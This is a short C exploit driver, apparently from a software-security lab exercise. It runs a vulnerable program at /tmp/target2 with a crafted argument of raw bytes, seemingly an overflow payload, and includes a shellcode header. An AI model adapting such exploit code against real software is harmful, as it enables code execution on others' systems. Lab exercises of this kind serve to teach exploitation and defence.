#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
	char arg1[] = "1,\xC1\xFE\xD1\xAE\xC1\xFE\xD1\xAE\xC1\xFE\xD1\xAE\x55\x55\xaa\xaa";
	char *args[] = { TARGET, arg1, NULL };
	char *env[] = { NULL };

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
